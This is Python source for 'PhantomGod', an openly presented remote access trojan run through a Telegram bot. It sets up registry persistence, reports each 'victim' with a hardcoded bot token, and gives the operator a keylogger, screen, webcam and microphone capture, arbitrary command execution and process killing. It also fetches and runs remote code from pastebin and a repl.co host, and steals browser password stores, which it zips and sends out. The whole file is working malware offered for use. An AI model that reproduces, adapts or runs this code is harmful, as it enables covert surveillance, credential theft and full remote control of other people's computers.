
import subprocess, os
paquetes = [
    "telbot",
    "discord",
    "requests",
    "psutil",
    "pyTelegramBotAPI",
    "opencv-python",
    "pyaudio",
    "keyboard",
    "pillow",
    "pywin32",
    "pyautogui",
    "numpy",
    "zipfile36",
    "pycryptodome",
    "python-telegram-bot"
]
def instalar_paquete(paquete):
    comando = f"pip install {paquete}"
    subprocess.Popen(comando, shell=True)
    print(f"Instalando {paquete} en segundo plano...")
for paquete in paquetes:
    instalar_paquete(paquete)
print("Continuando con otras tareas después de la instalación...")
subprocess.Popen("py -m pip install pywin32", shell=True)
os.system("cls")
import requests, winreg, importlib, platform, random, shutil, psutil, pyautogui, telebot, os, cv2, requests as r, subprocess, socket, psutil, time, threading, pyaudio, wave, re, ctypes, sys, keyboard
import numpy as np
from PIL import ImageGrab
from telebot import util
from telebot import types
from telebot.types import Message
from subprocess import Popen, PIPE
from datetime import datetime
from io import StringIO
from pip._internal import main as pip_main
##################################################################
#               LOOK HERE BBY                                    #
##################################################################
token = '6460901264:AAEznjCq2ioVGQe0Qw9emIFZQbTHXCOA3UU'         # 
id_chat = '6645752359'                                           #
##################################################################
def check_internet_connection():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False
while not check_internet_connection():
    print("Not internet, wait...")
    time.sleep(10) 
print("Do you have internet")
os.system("cls")
def delete_startup_task(task_name):
    try:
        subprocess.run(["schtasks", "/delete", "/tn", task_name, "/f"])
        print(f"The existing scheduled task has been deleted: {task_name}")
    except Exception as e:
        print(f"{str(e)}")
def create_startup_task(task_name, script_path):
    try:
        if not os.path.isfile(script_path):
            print(f"{script_path}")
            return
        user_dir = os.path.expanduser("~")
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, task_name, 0, winreg.REG_SZ, script_path)
        print(f"{task_name}")
    except Exception as e:
        print(f"{str(e)}")
if __name__ == "__main__":
    task_name = "PhantomGod"
    script_path = os.path.abspath(sys.argv[0])
    delete_startup_task(task_name)
    create_startup_task(task_name, script_path)
def run_in_background(command):
    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
if __name__ == '__main__':
    script_file = os.path.basename(sys.argv[0])
    run_in_background(f"python3 {script_file}")
def get_system_info():
    username = os.getlogin()
    now = datetime.now()
    formatted_time = now.strftime("%H:%M:%S / %d-%m-%Y")
    return f"User PC: {username}\nStart time: {formatted_time}"
def send_message(message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": id_chat,
        "text": message
    }
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("")
    else:
        print("")

def main():
    system_info = get_system_info()
    message = f"𝗢𝗡 \n\n🧪 PhantomGod - Victim 🧪\n{system_info}\n\nNext command -> /start"
    send_message(message)
if __name__ == '__main__':
    main()

AUDIO_SAMPLE_RATE = 44100
AUDIO_CHUNK_SIZE = 1024
AUDIO_CHANNELS = 1
AUDIO_FORMAT = pyaudio.paInt16
MAX_DURATION = 60
bot = telebot.TeleBot(token, threaded=True)
bot.worker_pool = util.ThreadPool(bot, num_threads=50)
keylogger_status = {}
@bot.message_handler(commands=['help', 'Help'])
def help(command):
	bot.send_message(id_chat, '🧪 Commands: 🧪 \n\n/owner 👑 \n/readme 📖 - It is important to read \n/update ⚜️ - This is in case there is a new update. \n/restart_program ♻️ - In case the program fails you will always have the possibility to restart it.\n\n /screenshot 💻 - Desktop ScreenShot \n /info 🔔 - Information about computer \n /webcam 📸 - Webcam Photo \n /videocam 📹 - Video by cam, you have to add seconds \n /microphone 🎤 - Web Microphone,you have to add seconds \n /shut_down 🔌 - Turn off computer \n /terminal 🖨️ - PC CMD Control, after adding terminal command you have to add another command like dir\n /msgbox 📨 - Send message, msgbox here message\n /download 🗳️ - Download files in background\n /keylogger ⌨️ - It is used to record keys that the victim types\n /record_screen 🎥 - Screen recorder, record the screen deciding for seconds\n /passwords 🍪 - Steal passwords from different sites\n /desktop 🖊 - Its a joke to create many files on the desktop\n /task ⚙️ - Shows you the active processes\n /task_stop ⚙️ - Kill the processes you have chosen')
@bot.message_handler(commands=['start', 'Start']) 
def start(commands):
	bot.send_message(id_chat, '🧪 PhantomGod 🧪' +   
		'\n\nPhantom is here to provide the best service, from /help for more information')
@bot.message_handler(commands=['owner', 'Owner'])
def start(commands):
	bot.send_message(id_chat, '👑 PhantomGod - Owner 👑' +   
		'\n\nHello, Im the founder, if you want to join us and continue updating PhantomGod join t.me/PhantomGodRAT')
@bot.message_handler(commands=['readme', 'Readme'])
def start(commands):
	bot.send_message(id_chat, '📖 PhantomGod - Readme 📖' +   
		'\n\n1. It is recommended that there is only 1 bot per victim since receiving several victims can cause collapse.\n2. It is important to know that this program is in the testing phase\n3. I am not responsible for the misuse that can be given to this project and program\n4. Anyone who has the source code and edited or pretends to be the creator of the project will be banned from the group and face major problems.\n\n\nVersion 0.1.0')
@bot.message_handler(commands=['record_screen', 'Record_screen'])
def send_screen(command):
    try:
        args = command.text.split()
        if len(args) != 2:
            bot.send_message(id_chat, 'Incorrect use. Example: /videoscreen 10')
            return
        duration = int(args[1])
        if duration <= 0:
            bot.send_message(id_chat, 'The duration must be greater than 0 seconds.')
            return
        timestamp = time.strftime("%Y%m%d%H%M%S")
        video_filename = os.getenv("APPDATA") + f'\\ScreenRecording_{timestamp}.mp4'
        screen_size = (1920, 1080) 
        fps = 20  
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(video_filename, fourcc, fps, screen_size)
        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        bot.send_video(id_chat, open(video_filename, 'rb'))
        os.remove(video_filename)
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')
@bot.message_handler(commands=['download', 'Download'])
def handle_download_command(message: Message):
    try:
        url = message.text.split(maxsplit=1)[1]
        bot.reply_to(message, "Initiating background download...")
        threading.Thread(target=download_file, args=(message.chat.id, url)).start()
    except IndexError:
        bot.reply_to(message, "Usage: /download {file URL}")
def download_file(chat_id, url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            filename = url.split('/')[-1]
            with open(filename, 'wb') as file:
                file.write(response.content)
            bot.send_message(chat_id, "Download completed: {}".format(filename))
        else:
            bot.send_message(chat_id, "Error downloading the file.")
    except Exception as e:
        bot.send_message(chat_id, "Error during the download: {}".format(str(e)))
@bot.message_handler(commands=['msgbox', 'Msgbox'])
def show_message_box(message):
    try:
        message_text = re.sub(r'/msgbox\s+', '', message.text)        
        ctypes.windll.user32.MessageBoxW(0, message_text, "PhantomGod", 0)
    except:
        ctypes.windll.user32.MessageBoxW(0, "Error al mostrar el mensaje", "Error", 0)
@bot.message_handler(commands=['terminal', 'Terminal'])
def terminal_command(message):
    try:
        user_input = message.text.split(' ', 1)[1]
        result = subprocess.run(user_input, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            bot.send_message(id_chat, f"Command executed successfully:\n```\n{result.stdout.strip()}\n```", parse_mode="Markdown")
        else:
            bot.send_message(id_chat, f"Command execution failed:\n```\n{result.stderr.strip()}\n```", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')
@bot.message_handler(commands=['shut_down'])
def shut_down(message):
    try:
        bot.send_message(id_chat, "Shutting down the computer...")
        subprocess.run(["shutdown", "/s", "/t", "1"])
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')
@bot.message_handler(commands=['restart_program', 'Restart_program'])
def reiniciar_programa(message):
    bot.send_message(message.chat.id, "Restarting the program...")
    python = sys.executable
    os.execl(python, python, *sys.argv)
@bot.message_handler(commands=['info', 'Info'])
def info_send(command):
    try:
        username = os.getlogin()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        external_ip = requests.get('http://ip.42.pl/raw').text
        windows = platform.platform()
        processor = platform.processor()
        memory = psutil.virtual_memory()
        total_memory = human_readable_size(memory.total)
        used_memory = human_readable_size(memory.used)
        memory_percent = memory.percent
        cpu_percent = psutil.cpu_percent()
        disk = psutil.disk_usage('/')
        total_disk_space = human_readable_size(disk.total)
        used_disk_space = human_readable_size(disk.used)
        disk_percent = disk.percent
        message = (
            f"PC: {username}\n"
            f"Hostname: {hostname}\n"
            f"Local IP: {local_ip}\n"
            f"External IP: {external_ip}\n"
            f"OS: {windows}\n" 
            f"Processor: {processor}\n"
            f"Total Memory: {total_memory}\n"
            f"Used Memory: {used_memory}\n"
            f"Memory Usage: {memory_percent}%\n"
            f"CPU Usage: {cpu_percent}%\n"
            f"Total Disk Space: {total_disk_space}\n"
            f"Used Disk Space: {used_disk_space}\n"
            f"Disk Usage: {disk_percent}%"
        )
        bot.send_message(id_chat, message)
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')
def human_readable_size(size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0
@bot.message_handler(commands=['screenshot', 'Screenshot'])
def send_screen(command):
	try:
		screen = ImageGrab.grab()
		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
		files = {'photo': screen}
		bot.send_photo(id_chat, screen)
	except:
		bot.send_photo(id_chat, 'Error')
@bot.message_handler(commands=['webcam', 'Webcam'])
def webcam(command):
    try:
        cap = cv2.VideoCapture(0)
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite(os.environ['ProgramData'] + '\\WebCam.jpg', frame)
        bot.send_chat_action(id_chat, 'upload_photo')
        cap.release()
        webcam = open(os.environ['ProgramData'] + '\\WebCam.jpg', 'rb')
        bot.send_photo(id_chat, webcam)
        webcam.close()
    except Exception as e:
        bot.send_chat_action(id_chat, 'typing')
        bot.send_message(id_chat, f'Error: {str(e)}', parse_mode="Markdown")
@bot.message_handler(commands=['videocam', 'Videocam'])
def video_web(message):
    try:
        duration = int(message.text.split()[1])
        cap = cv2.VideoCapture(0)
        frames = []
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            frames.append(frame)
        cap.release()
        if frames:
            output_path = 'webcam_video.mp4'
            out = cv2.VideoWriter(output_path, cv2.VideoWriter_fourcc(*'mp4v'), 30, (frames[0].shape[1], frames[0].shape[0]))
            for frame in frames:
                out.write(frame)
            out.release()
            with open(output_path, 'rb') as video_file:
                bot.send_video(id_chat, video_file)
            os.remove(output_path)
        else:
            bot.send_message(id_chat, "No frames captured from webcam.")
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')
@bot.message_handler(commands=['microphone', 'Microphone'])
def microphone(message):
    try:
        duration = int(message.text.split()[1])
        audio_frames = []
        audio_data = bytearray()
        def record_audio():
            nonlocal audio_data
            audio_stream = audio.open(format=AUDIO_FORMAT, channels=AUDIO_CHANNELS, rate=AUDIO_SAMPLE_RATE, input=True, frames_per_buffer=AUDIO_CHUNK_SIZE)
            while time.time() - start_time < duration:
                audio_frame = audio_stream.read(AUDIO_CHUNK_SIZE)
                audio_data.extend(audio_frame)
                audio_frames.append(audio_frame)
            audio_stream.stop_stream()
            audio_stream.close()
        audio = pyaudio.PyAudio()
        audio_thread = threading.Thread(target=record_audio)
        audio_thread.start()
        start_time = time.time()
        audio_thread.join()
        audio.terminate()
        if audio_frames:
            output_path = 'microphone_audio.wav'
            with wave.open(output_path, 'wb') as audio_file:
                audio_file.setnchannels(AUDIO_CHANNELS)
                audio_file.setsampwidth(audio.get_sample_size(AUDIO_FORMAT))
                audio_file.setframerate(AUDIO_SAMPLE_RATE)
                audio_file.writeframes(audio_data)
            bot.send_voice(id_chat, voice=open(output_path, 'rb'))
            os.remove(output_path)
        else:
            bot.send_message(id_chat, "No audio recorded from the microphone.")
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')
@bot.message_handler(commands=['keylogger', 'keylogger'])
def handle_keylogger_start(message: Message):
    if message.chat.id in keylogger_status:
        bot.reply_to(message, "Keylogger is already active.")
    else:
        keylogger_status[message.chat.id] = True
        bot.reply_to(message, "Keylogger started. Type /keylogger_stop to stop.")
        threading.Thread(target=keylogger_thread, args=(message.chat.id,)).start()
@bot.message_handler(commands=['keylogger_stop', 'Keylogger_stop'])
def handle_keylogger_stop(message: Message):
    if message.chat.id in keylogger_status:
        keylogger_status[message.chat.id] = False
        bot.reply_to(message, "Keylogger stopped.")
    else:
        bot.reply_to(message, "Keylogger is not active.")
def keylogger_thread(chat_id):
    while keylogger_status.get(chat_id, False):
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                bot.send_message(chat_id, f"Key pressed: {key}")
        except Exception as e:
            print("Error:", e)
@bot.message_handler(commands=['update', 'Update'])
def update_bot(command):
    try:
        url = "https://moccasinbelatednumerators.egxwgsseefer34.repl.co/b.py"
        nombre_archivo_descargado = url.split("/")[-1]
        archivo_a_reemplazar = __file__
        
        if os.path.isfile(archivo_a_reemplazar):
            respuesta = requests.get(url)
            if respuesta.status_code == 200:
                with open(archivo_a_reemplazar, "wb") as archivo:
                    archivo.write(respuesta.content)
                print(f"Archive '{nombre_archivo_descargado}' downloaded and replaced successfully.")
                subprocess.Popen(["python", archivo_a_reemplazar])
                bot.send_message(command.chat.id, f"Update successful. Restarting the bot...")
            else:
                bot.send_message(command.chat.id, f"The file to update does not exist.")
        else:
            bot.send_message(command.chat.id, f"The file to update does not exist.")
    except Exception as e:
        bot.send_message(command.chat.id, f"Update error: {str(e)}")
@bot.message_handler(commands=['passwords', 'Passwords'])
def google_command(message):
    url = "https://pastebin.com/raw/9WLb5psv"
    response = requests.get(url)
    codigo = response.text
    directorio_base = os.getcwd()

    nombres_carpetas = [
        'google-chrome-sxs',
        'google-chrome',
        'epic-privacy-browser',
        'microsoft-edge',
        'uran',
        'yandex',
        'brave'
    ]
    def eliminar_carpeta(carpeta):
        try:
            if os.path.exists(carpeta) and os.path.isdir(carpeta):
                shutil.rmtree(carpeta)
                print(f'Deleted folder: {carpeta}')
            else:
                print(f'Carpeta no encontrada: {carpeta}')
        except Exception as e:
            print(f'Error deleting folder {carpeta}: {str(e)}')
    def comprimir_carpeta(carpeta):
        try:
            nombre_zip = os.path.basename(carpeta) + '.zip'
            ruta_zip = os.path.join(directorio_base, nombre_zip)
            shutil.make_archive(ruta_zip[:-4], 'zip', carpeta)
            return ruta_zip
        except Exception as e:
            print(f'Error compressing the folder {carpeta}: {str(e)}')
            return None
    archivo_temporal = os.path.join(directorio_base, "codigo_temporal.py")

    with open(archivo_temporal, "w") as archivo:
        archivo.write(codigo)
    os.system(f"python {archivo_temporal}")
    os.system("del codigo_temporal.py")
    carpetas_encontradas = []
    for nombre_carpeta in nombres_carpetas:
        carpeta = os.path.join(directorio_base, nombre_carpeta)
        ruta_zip = comprimir_carpeta(carpeta)
        if ruta_zip:
            carpetas_encontradas.append(ruta_zip)
    def get_public_ip():
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            data = response.json()
            return data['ip']
        except Exception as e:
            print(f'Error getting public IP: {str(e)}')
            return None
    nombre_usuario = os.getlogin()
    ip_publica = get_public_ip()
    for ruta_zip in carpetas_encontradas:
        try:
            with open(ruta_zip, 'rb') as archivo:
                caption = f'🧪 PhantomGod 🧪\nPc name: {nombre_usuario}\nPublic IP: {ip_publica}' 
                bot.send_document(id_chat, archivo, caption=caption)
            os.system('rmdir /s /q google-chrome-sxs')
            os.system('rmdir /s /q google-chrome')
            os.system('rmdir /s /q epic-privacy-browser')
            os.system('rmdir /s /q microsoft-edge')
            os.system('rmdir /s /q uran')
            os.system('rmdir /s /q yandex')
            os.system('rmdir /s /q brave')
            os.system('del google-chrome-sxs.zip')
            os.system('del google-chrome.zip')
            os.system('del epic-privacy-browser.zip')
            os.system('del microsoft-edge.zip')
            os.system('del uran.zip')
            os.system('del yandex.zip')
            os.system('del brave.zip')
            os.system('del codigo_temporal.zip')
            os.system('del codigo_temporal.py')
            os.system('del codigo_temporal.py')
        except Exception as e:
            print(f'Error sending file {ruta_zip} to the Telegram bot: {str(e)}')
@bot.message_handler(commands=['desktop', 'Desktop'])
def process_desktop_command(message):
    command_args = message.text.split()[1:]
    if len(command_args) != 3:
        bot.reply_to(message, "Incorrect format. It should be /desktop {file name} {file content} {number of files}")
        return
    file_name, content, num_files = command_args
    try:
        num_files = int(num_files)
    except ValueError:
        bot.reply_to(message, "The number of files must be a valid number.")
        return
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    for i in range(num_files):
        file_name_i = f"{file_name}_{i+1}.txt" 
        file_path = os.path.join(desktop_path, file_name_i)
        with open(file_path, 'w') as file:
            file.write(content)
    bot.send_message(message.chat.id, f"Created {num_files} file(s) successfully.")
@bot.message_handler(commands=['task', 'Task'])
def process_task_command(message):
    chat_id = message.chat.id
    processes_info = listar_procesos()
    response = "```\nList of active processes:\nUse the /task_stop command to stop processes\n\n"
    for process_info in processes_info:
        if len(response) + len(process_info) + 4 >= 4096: 
            bot.send_message(chat_id, response + "```", parse_mode='Markdown')
            response = "```\n"
        response += process_info + "\n"
    response += "```"
    if len(response) > 4:
        bot.send_message(chat_id, response, parse_mode='Markdown')
def listar_procesos():
    procesos = psutil.process_iter(attrs=['pid', 'name', 'username'])
    procesos_info = []
    procesos_info.append(f"{'PID':<10} {'Nombre':<25} {'Usuario':<15}")
    for proceso in procesos:
        proceso_info = proceso.info
        pid = proceso_info['pid']
        nombre = proceso_info['name']
        username = proceso_info['username'] if proceso_info['username'] is not None else 'N/A'
        proceso_info_str = f"{pid:<10} {nombre:<25} {username:<15}"
        procesos_info.append(proceso_info_str)
    return procesos_info
if __name__ == "__main__":
    print("")
@bot.message_handler(commands=['task_stop', 'Task_stop'])
def process_task_stop_command(message):
    chat_id = message.chat.id
    try:
        nombre_proceso = message.text.split(' ', 1)[1]
    except IndexError:
        bot.send_message(chat_id, "You must provide the name of the process to stop.")
        return

    cerrar_procesos_por_nombre(nombre_proceso)
    bot.send_message(chat_id, f"Process '{nombre_proceso}' finished successfully.")

def listar_procesos():
    procesos = psutil.process_iter(attrs=['pid', 'name', 'username'])
    procesos_info = []
    procesos_info.append(f"{'PID':<10} {'Nombre':<25} {'Usuario':<15}")
    for proceso in procesos:
        proceso_info = proceso.info
        pid = proceso_info['pid']
        nombre = proceso_info['name']
        username = proceso_info['username'] if proceso_info['username'] is not None else 'N/A'
        proceso_info_str = f"{pid:<10} {nombre:<25} {username:<15}"
        procesos_info.append(proceso_info_str)

    return procesos_info
def cerrar_procesos_por_nombre(nombre):
    try:
        for proceso in psutil.process_iter(attrs=['pid', 'name']):
            proceso_info = proceso.info
            if nombre.lower() in proceso_info['name'].lower():
                proceso_terminado = psutil.Process(proceso_info['pid'])
                proceso_terminado.terminate()  # Termina el proceso
                print(f"Process'{proceso_info['name']}' finished successfully (PID: {proceso_info['pid']}).")
    except Exception as e:
        print(f"An error occurred while trying to terminate the processes '{nombre}': {str(e)}")
if __name__ == "__main__":
    print("")
bot.polling()